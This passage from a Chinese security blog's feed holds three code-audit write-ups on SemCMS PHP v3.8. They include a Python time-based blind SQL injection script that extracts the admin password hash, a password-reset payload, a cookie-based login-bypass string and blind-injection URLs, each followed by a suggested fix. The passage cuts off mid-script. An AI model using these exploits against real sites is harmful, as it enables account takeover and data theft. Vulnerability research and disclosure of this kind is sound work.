class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">views</span><span class="params">()</span></span>&#123;TINY.box.show(<span class="string">'SEMCMS_Remail.php?type=find'</span>,<span class="number">1</span>,<span class="number">500</span>,<span class="number">130</span>,<span class="number">1</span>)&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (Request(<span class="string">"type"</span>)==<span class="string">"ok"</span>)&#123;</span></span><br><span class="line"><span class="actionscript"> <span class="keyword">var</span> umail=Request(<span class="string">"umail"</span>) ; </span></span><br><span class="line"><span class="actionscript">TINY.box.show(<span class="string">'SEMCMS_Remail.php?type=ok&amp;umail='</span>+umail,<span class="number">1</span>,<span class="number">500</span>,<span class="number">230</span>,<span class="number">1</span>)    </span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">Request</span><span class="params">(strName)</span></span></span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="javascript">thisURL = <span class="built_in">decodeURIComponent</span>(<span class="built_in">document</span>.URL);</span></span><br><span class="line"><span class="undefined">strwrite = thisURL</span></span><br><span class="line"><span class="actionscript"><span class="comment">//document.write(strwrite);</span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> strHref =strwrite;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> intPos = strHref.indexOf(<span class="string">"?"</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> strRight = strHref.substr(intPos + <span class="number">1</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> arrTmp = strRight.split(<span class="string">"&amp;"</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrTmp.length; i++)</span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> arrTemp = arrTmp[i ].split(<span class="string">"="</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span>(arrTemp[<span class="number">0</span>].toUpperCase() == strName.toUpperCase()) <span class="keyword">return</span> arrTemp[<span class="number">1</span>];</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> <span class="string">""</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>可以当点击忘记密码时，会调用js的<code>views()</code>函数，而该，函数请求了<code>SEMCMS_Remail.php</code>。<br>跟进<code>SEMCMS_Remail.php</code>查看,发现又调用了<code>../Include/web_check.php</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"form"</span> <span class="attr">action</span>=<span class="string">"../Include/web_check.php?type=fintpassword"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">width</span>=<span class="string">"500"</span> <span class="attr">cellpadding</span>=<span class="string">"0"</span> <span class="attr">cellspacing</span>=<span class="string">"0"</span> <span class="attr">class</span>=<span class="string">"table"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"2"</span> <span class="attr">align</span>=<span class="string">"right"</span> <span class="attr">class</span>=<span class="string">"tdsbg"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">" float:left;"</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>找回账号密码!<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:TINY.box.hide()"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"SC_Page_Config/Image/icons/hr.gif"</span> <span class="attr">border</span>=<span class="string">"0"</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">"20%"</span> <span class="attr">align</span>=<span class="string">"right"</span> <span class="attr">valign</span>=<span class="string">"middle"</span>&gt;</span>输入E-mail:<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"left"</span> <span class="attr">valign</span>=<span class="string">"middle"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"Email"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"Email"</span> <span class="attr">size</span>=<span class="string">"50"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span> <span class="attr">valign</span>=<span class="string">"middle"</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span> <span class="attr">valign</span>=<span class="string">"middle"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"furl"</span> <span class="attr">id</span>=<span class="string">"furl"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo $url =  "</span><span class="attr">http:</span>//"<span class="attr">.</span>$<span class="attr">_SERVER</span> ['<span class="attr">HTTP_HOST</span>']<span class="attr">.</span>$<span class="attr">_SERVER</span>['<span class="attr">PHP_SELF</span>'];  ?&gt;</span>" &gt; <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"确认找回!"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>再次跟进<code>../Include/web_check.php</code><br>发现可以通过直接访问该页面，传入相应的操作进行请求,而无需从后台登陆处忘记密码进入。<br>当GET传入的type为<code>findok</code>时，进入如下分支<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($Type==<span class="string">"findok"</span>)&#123; <span class="comment">//  密码找回  </span></span><br><span class="line"> </span><br><span class="line">     $umail=test_input(verify_str($_POST[<span class="string">'Email'</span>]));</span><br><span class="line">     $umm=test_input(verify_str($_POST[<span class="string">'umima'</span>]));</span><br><span class="line">     $urzm=test_input(verify_str($_POST[<span class="string">'uyzm'</span>]));</span><br><span class="line">     $fhurl=str_replace(<span class="string">"SEMCMS_Remail.php"</span>,<span class="string">""</span>,$_POST[<span class="string">'furl'</span>]);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">empty</span>($umail) || <span class="keyword">empty</span>($umm) || <span class="keyword">empty</span>($urzm))&#123;</span><br><span class="line">         </span><br><span class="line">          <span class="keyword">echo</span><span class="string">'&lt;script language="javascript"&gt;alert("请输入密码与认证码！");history.go(-1);&lt;/script&gt;'</span>;   </span><br><span class="line">         </span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         $query=$db_conn-&gt;query(<span class="string">"select * from sc_user where user_email='"</span>.$umail.<span class="string">"' and user_rzm='"</span>.$urzm.<span class="string">"'"</span>);</span><br><span class="line">         <span class="keyword">if</span> (mysqli_num_rows($query)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">         $db_conn-&gt;query(<span class="string">"UPDATE  sc_user SET user_ps=md5($umm)  WHERE user_email='"</span>.$umail.<span class="string">"' and user_rzm='$urzm'"</span>); </span><br><span class="line">         <span class="keyword">echo</span><span class="string">'&lt;script language="javascript"&gt;alert("操作成功返回登陆！");location.href="'</span>.$fhurl.<span class="string">'";&lt;/script&gt;'</span>;</span><br><span class="line">         &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">echo</span><span class="string">'&lt;script language="javascript"&gt;alert("邮箱或者验证码错误");location.href="'</span>.$fhurl.<span class="string">'";&lt;/script&gt;'</span>;  </span><br><span class="line">         &#125; </span><br><span class="line">         </span><br><span class="line">     &#125;   </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>而仔细观察后发现，这里漏洞利用点是前面两篇出现问题的集合，第一篇中讲到可以通过sql盲注获取当前表段的内容，但是由于在那张表中的信息没有很多用处而显得相对鸡肋。而第二篇则是查询两个参数，由于没有对反斜线做过滤，导致前一个参数可以将单引号转义，从而与后面参数单引号闭合导致注入。<br>这里的问题便是两个参数，前者可以将后者闭合，而当前表又是存储了账号密码的<code>sc_user</code>表，是第一篇的鸡肋得到放大。</p><h2 id="0x02-poc"><a href="#0x02-poc" class="headerlink" title="0x02 poc"></a>0x02 poc</h2><p>话不多说，直接放上payload<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">"http://127.0.0.1:80/semcms_php_v3.8/include/web_check.php?type=findok"</span></span><br><span class="line">burp0_headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>, <span class="string">"Referer"</span>: <span class="string">"http://127.0.0.1/semcms_php_v3.8/include/web_check.php?type=finddo&amp;XDEBUG_SESSION_START=17436"</span>, <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"or if(ascii(substr(user_ps,&#123;0&#125;,1)) like &#123;1&#125;,sleep(3),1)-- -"</span></span><br><span class="line">passwd = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">burp0_data=&#123;<span class="string">"Email"</span>: <span class="string">"1\\\\"</span>, <span class="string">"umima"</span>: <span class="string">"boogle"</span>, <span class="string">"uyzm"</span>: payload.<span class="built_in">format</span>(str(i),str(j))&#125;</span><br><span class="line">start_time = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">res = requests.post(burp0_url,headers=burp0_headers,data=burp0_data)</span><br><span class="line">#<span class="built_in">print</span> burp0_data</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">time</span>.<span class="built_in">time</span>()-start_time &gt; <span class="number">3</span>:</span><br><span class="line">passwd+=chr(j)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"[+]The md5 password is :"</span>+passwd</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"[+]Success get the password!"</span></span><br></pre></td></tr></table></figure></p><h2 id="0x03-修改后台密码"><a href="#0x03-修改后台密码" class="headerlink" title="0x03 修改后台密码"></a>0x03 修改后台密码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$db_conn</span>-&gt;query(<span class="string">"UPDATE  sc_user SET user_ps=md5(<span class="variable">$umm</span>)  WHERE user_email='"</span>.<span class="variable">$umail</span>.<span class="string">"' and user_rzm='<span class="variable">$urzm</span>'"</span>);</span><br></pre></td></tr></table></figure><p>对前面的payload执行结果可以看到，这里由于数据库中对密码采用md5加密，如果密码比较复杂的话，可以就无法查询出明文结果。<br><img src="https://i.loli.net/2019/03/15/5c8b1ddb08bee.png" alt><br>那么便可以继续查看<code>findok</code>后面的<code>update</code>操作。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$db_conn</span>-&gt;query(<span class="string">"UPDATE  sc_user SET user_ps=md5(<span class="variable">$umm</span>)  WHERE user_email='"</span>.<span class="variable">$umail</span>.<span class="string">"' and user_rzm='<span class="variable">$urzm</span>'"</span>);</span><br></pre></td></tr></table></figure></p><p>在该操作中，如果知道<code>$umail</code>和<code>$urzm</code>的值，便可以对密码进行修改。<br>而这两个值均可以通过前面注入出密码的方法得到，这里不再赘述，诸位可自行继续操作。<br>例如此处得到<a href="mailto:`$umail=boogle@qq.com" target="_blank" rel="noopener">`$umail=boogle@qq.com</a><code></code>$urzm=6666`<br>修改密码payload<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//post</span></span><br><span class="line"></span><br><span class="line">Email=boogle@qq.com<span class="variable">&amp;umima</span>=boogle_password<span class="variable">&amp;urzm</span>=<span class="number">6666</span></span><br></pre></td></tr></table></figure></p><p>此处成功修改后台管理员密码为<code>123</code><br><img src="https://i.loli.net/2019/03/15/5c8b9c15355d0.png" alt></p><h2 id="0x04-修复方法"><a href="#0x04-修复方法" class="headerlink" title="0x04 修复方法"></a>0x04 修复方法</h2><p>还是可以通过之前的修复方法，对反斜线<code>\</code>增加过滤即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;此篇为审计semcms_php_v3.8的第三篇文章&lt;/p&gt;
&lt;p&gt;SemCms是一套开源外贸企业网
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="0day挖掘" scheme="https://zhengbao.wang/tags/0day%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>semcms_php_v3.8 cookie注入绕过后台登陆</title>
    <link href="https://zhengbao.wang/semcms-php-v3-8-cookie%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86/"/>
    <id>https://zhengbao.wang/semcms-php-v3-8-cookie注入绕过后台登陆/</id>
    <published>2019-03-15T13:18:18.000Z</published>
    <updated>2019-03-25T00:34:59.569Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>此篇为审计semcms_php_v3.8的第二篇文章</p><p>SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。<br>SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。<br>官网:<a href="http://www.sem-cms.com" target="_blank" rel="noopener">http://www.sem-cms.com/</a><br>审计版本为最新php版 v3.8<br><img src="https://i.loli.net/2019/03/14/5c89d09c2c001.png" alt></p><h2 id="0x01-cookie注入导致后台登陆绕过"><a href="#0x01-cookie注入导致后台登陆绕过" class="headerlink" title="0x01 cookie注入导致后台登陆绕过"></a>0x01 cookie注入导致后台登陆绕过</h2><p>首先查看后台主页<code>SEMCMS_Main.php</code>,包含了<code>SEMCMS_Top_include.php</code>,跟进看到<code>checkuser</code>函数，猜测应该时验证是否登陆的。<br><img src="https://i.loli.net/2019/03/14/5c8a3d5daa79b.png" alt><br>继续跟进<code>checkuser()</code>函数<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> checkuser(<span class="variable">$db_conn</span>)&#123; <span class="regexp">//</span>判断用户是否登陆</span><br><span class="line"></span><br><span class="line">    <span class="variable">$cookieuseradmin</span>=@verify_str(test_input(<span class="variable">$_COOKIE</span>[<span class="string">"scuseradmin"</span>]));</span><br><span class="line">    <span class="variable">$cookieuserpass</span>=@verify_str(test_input(<span class="variable">$_COOKIE</span>[<span class="string">"scuserpass"</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span>=<span class="variable">$db_conn</span>-&gt;query(<span class="string">"select * from sc_user where user_admin='$cookieuseradmin' and user_ps='$cookieuserpass'"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mysqli_num_rows(<span class="variable">$query</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">         <span class="variable">$row</span>=mysqli_fetch_assoc(<span class="variable">$query</span>);</span><br><span class="line">         return <span class="variable">$row</span>[<span class="string">'user_qx'</span>];</span><br><span class="line"></span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        echo <span class="string">"&lt;script language='javascript'&gt;alert('账号密码不正确重新登陆！');top.location.href='index.html';&lt;/script&gt;"</span>;</span><br><span class="line">        <span class="keyword">exit</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现用户名和密码均来自cookie，然后带入sql语句查询，要传入的值经过了<code>test_input</code>和<code>verify_str</code>的过滤，跟进查看一下。<br><code>verify_str</code>的值我们上一篇审计的时候查看过了，过滤几个sql语句<br><img src="https://i.loli.net/2019/03/14/5c8a3f84e17da.png" alt><br>虽然过滤了单引号<code>&#39;</code>，但是并没有过滤<code>\</code>,看看是否能通过转义符<code>\</code>将<code>$cookieuseradmin</code>后面的单引号闭合，从而绕过检测。<br>继续查看<code>test_input</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_input</span><span class="params">($data)</span> </span>&#123; </span><br><span class="line">      $data = str_replace(<span class="string">"%"</span>, <span class="string">"percent"</span>, $data);</span><br><span class="line">      $data = trim($data);</span><br><span class="line">      $data = stripslashes($data);</span><br><span class="line">      $data = htmlspecialchars($data,ENT_QUOTES);</span><br><span class="line">      <span class="keyword">return</span> $data;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>这里需要注意的是<code>stripslashes</code>，因为<code>stripslashes</code>对<code>\</code>作了处理，但是幸运的是两个反斜线<code>\\</code>时会返回一个。<br><img src="https://i.loli.net/2019/03/14/5c8a406b88631.png" alt></p><p>这里便可以构造cookie值<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">scuseradmin</span>=Admin\\; <span class="attribute">s</span><span class="attribute">c</span><span class="attribute">u</span><span class="attribute">s</span><span class="attribute">e</span><span class="attribute">r</span><span class="attribute">p</span><span class="attribute">a</span><span class="attribute">s</span><span class="attribute">s</span>=or 1 like 1 -- -;</span><br></pre></td></tr></table></figure></p><p>那么拼接后的sql语句即为<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> sc_user <span class="keyword">where</span> user_admin=<span class="string">'Admin\\'</span> <span class="keyword">and</span> user_ps=<span class="string">'or 1 like 1 -- -'</span></span><br></pre></td></tr></table></figure></p><p>成功绕过登陆</p><h2 id="0x02-poc"><a href="#0x02-poc" class="headerlink" title="0x02 poc"></a>0x02 poc</h2><p><img src="https://i.loli.net/2019/03/14/5c8a418947e7e.png" alt></p><h2 id="0x03-修复方法"><a href="#0x03-修复方法" class="headerlink" title="0x03 修复方法"></a>0x03 修复方法</h2><p><code>inject_check_sql()</code>函数中增加对反斜线<code>\</code>的过滤</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;此篇为审计semcms_php_v3.8的第二篇文章&lt;/p&gt;
&lt;p&gt;SemCms是一套开源外贸企业网
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="0day挖掘" scheme="https://zhengbao.wang/tags/0day%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>semcms_php_v3.8 前台鸡肋sql注入</title>
    <link href="https://zhengbao.wang/semcms-php-v3-8-%E5%89%8D%E5%8F%B0%E9%B8%A1%E8%82%8Bsql%E6%B3%A8%E5%85%A5/"/>
    <id>https://zhengbao.wang/semcms-php-v3-8-前台鸡肋sql注入/</id>
    <published>2019-03-14T13:16:03.000Z</published>
    <updated>2019-03-25T00:35:21.345Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。<br>SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。<br>官网:<a href="http://www.sem-cms.com/" target="_blank" rel="noopener">http://www.sem-cms.com/</a><br>审计版本为最新php版 <code>v3.8</code><br><img src="https://i.loli.net/2019/03/14/5c89d09c2c001.png" alt></p><h2 id="0x01-鸡肋sql注入"><a href="#0x01-鸡肋sql注入" class="headerlink" title="0x01 鸡肋sql注入"></a>0x01 鸡肋sql注入</h2><p>首先查看<code>index.php</code><br><img src="https://i.loli.net/2019/03/14/5c89c8a1355b8.png" alt><br>引入了<code>web_inc.php</code>,跟进查看，发现第一处sql查询<br><img src="https://i.loli.net/2019/03/14/5c89c8dfa6530.png" alt><br>可以看到<code>language</code>变量未用引号包裹，但是在此之前使用<code>verify_str()</code>函数对传入的参数进行了处理。<br>跟进发现是过滤函数,对常用sql语句进行了过滤<br><img src="https://i.loli.net/2019/03/14/5c89c84bc07d7.png" alt><br>针对过滤函数，可以发现可以对其进行sql盲注。<br>其中 <code>=</code> 可以使用<code>like</code>绕过<br>构造注入语句<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>/semcms_php_v3<span class="meta">.8</span>/?languageIDD=<span class="number">1</span> <span class="keyword">and</span> greatest(length(database()),<span class="number">0</span>) like <span class="number">1</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/14/5c89ca93d6243.png" alt><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>/semcms_php_v3<span class="meta">.8</span>/?languageIDD=<span class="number">1</span> <span class="keyword">and</span> greatest(length(database()),<span class="number">0</span>) like <span class="number">5</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/14/5c89ca37ab50c.png" alt><br>可以看到存在明显注入并得到数据库长度<br>但是这里比较鸡肋的是，因为过滤函数过滤了<code>select</code>。导致无法深层次的获取数据库内容，只能获取<code>database()</code>,’user()’,’version()’等信息。</p><h2 id="0x03-鸡肋放大"><a href="#0x03-鸡肋放大" class="headerlink" title="0x03 鸡肋放大"></a>0x03 鸡肋放大</h2><p>这里虽然无法使用<code>select</code>语句获取更多信息，但也不局限于<code>database()</code>等信息。<br>可以通过盲注获取当前表即其查询的<code>sc_tagandseo</code>表内其他字段内容。<br>因为该cms安装数据库时为自动安装，所以所有字段名都可以得到。<br><img src="https://i.loli.net/2019/03/14/5c89cc6d21650.png" alt><br>这里以<code>tag_newkey</code>为例<br><code>http://127.0.0.1/semcms_php_v3.8/?languageIDD=1%20and%20greatest(ascii(substr(tag_newkey,1,1)),0)%20like%201</code><br><img src="https://i.loli.net/2019/03/14/5c89cd482823e.png" alt><br><code>http://127.0.0.1/semcms_php_v3.8/?languageIDD=1%20and%20greatest(ascii(substr(tag_newkey,1,1)),0)%20like%20110</code><br><img src="https://i.loli.net/2019/03/14/5c89cd00f0af3.png" alt><br>页面返回不同证明了可以进行注入。</p><p>这里其实只是证明可以通过注入获取数据，然而从该表注入出的数据并没有什么卵用。<br>既然绕过了其过滤函数，继续全局搜索，看看其他表是否存在类似注入，稍微搜一下，发现<code>sc_email`</code>sc_msg`等多个表的查询还是有类似情况的，这几个表的信息还是比较丰富的，没有继续深究，诸位可继续深入挖掘。<br><img src="https://i.loli.net/2019/03/14/5c89ceff54e64.png" alt></p><h2 id="0x04-poc"><a href="#0x04-poc" class="headerlink" title="0x04 poc"></a>0x04 poc</h2><p>上面提到的简单exp，可供测试<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests </span><br><span class="line">#[+]author by boogle</span><br><span class="line">#[+]blo<span 